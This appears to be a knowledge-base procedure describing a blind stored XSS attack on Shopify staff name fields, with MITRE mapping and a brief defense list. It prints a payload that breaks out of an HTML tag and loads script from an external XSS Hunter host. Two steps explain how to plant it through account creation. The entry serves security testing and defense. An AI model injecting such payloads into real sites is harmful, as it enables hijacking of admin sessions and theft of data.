---
tags:
  - xss
  - payload-injection
  - shopify
type: procedure
tools:
  - '[[tools/XSS-Hunter]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:39.249Z'
sub_techniques: []
id: 32f26afc-3091-4633-bae0-2b20f1905c08
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-Staff-Names

## Summary

This procedure involves injecting a blind stored XSS payload into Shopify's staff first and last name fields during account creation, exploiting lack of sanitization to store executable JavaScript.

## Description

The vulnerability stems from insufficient escaping of user-supplied names, allowing HTML tag closure and script inclusion. The payload "><script>$.getScript("//█████████.xss.ht")</script> is entered into name fields, persists upon submission, and executes later in internal views. This targets web-based admin interfaces and requires XSS Hunter for confirmation.

## Requirements

1. Open staff creation form from previous procedure
2. Access to XSS Hunter service for payload generation (https://xss.ht)
3. Valid email for the staff account to complete creation

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs in name fields using HTML entity encoding
- Implement Content Security Policy (CSP) to block external script loads
- Scan for XSS payloads in admin form submissions via SIEM

## Objectives

1. Store malicious JavaScript in staff profile
2. Bypass any client-side validation
3. Persist payload for later execution

## Instructions

### Step 1: Generate Payload

**Context**: Craft a payload that closes tags and loads an external script for blind detection.

Use XSS Hunter to generate: "><script>$.getScript("//█████████.xss.ht")</script>

**Expected Output**: Unique payload URL for monitoring.

### Step 2: Enter Payload in Fields

**Context**: Fill name fields to inject the script, then complete other required fields.

Paste the payload into first name and last name fields. Add a valid email and minimal permissions, then submit.

**Expected Output**: Success message confirming staff account creation.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/XSS-Hunter]]

## Tags

- [[xss]]
- [[payload-injection]]
- [[shopify]]
